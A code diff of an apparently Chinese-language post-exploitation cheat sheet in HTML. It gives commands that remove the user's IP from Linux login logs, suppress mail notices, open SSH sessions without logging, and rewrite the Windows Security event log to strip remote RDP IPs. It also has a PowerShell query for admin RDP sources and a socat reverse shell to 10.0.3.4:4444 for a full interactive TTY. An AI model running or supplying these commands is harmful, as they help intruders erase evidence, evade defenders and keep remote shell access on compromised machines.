@@ -28,12 +28,16 @@
 	定向清理日志<br>
 		sed -i '/你的IP/d' /var/log/wtmp<br>
 		sed -i '/你的IP/d' /var/log/btmp<br>
-	查询管理员RDP来源IP<br>
-		powershell -c "get-winevent -filterhashtable @{logname='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational';ID=1149;} -MaxEvents 20 |ft -wrap -property TimeCreated,Message"<br>
+	
 	centos关闭mail发送日志<br>
 		echo "unset MAILCHECK">> /etc/profile<br>
 	SSH无日志登录<br>
 		ssh root@127.0.0.1 -T "/bin/sh -i"
+	<h2>windows 擦屁股<h2>
+	清除RDP登录IP：
+		wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx /q:"*[EventData[(Data[@Name='IpAddress']!='127.0.0.1')]]" /ow:true</br>
+	<h2>查询管理员RDP来源IP</h2>
+		powershell -c "get-winevent -filterhashtable @{logname='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational';ID=1149;} -MaxEvents 20 |ft -wrap -property TimeCreated,Message"<br>
 	<h2>linux 获得完全交互式TTY</h2>
 	方案一： python -c 'import pty; pty.spawn("/bin/bash")' <br>
 	方案二： socat file:`tty`,raw,echo=0 tcp-listen:4444  && socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 <br>
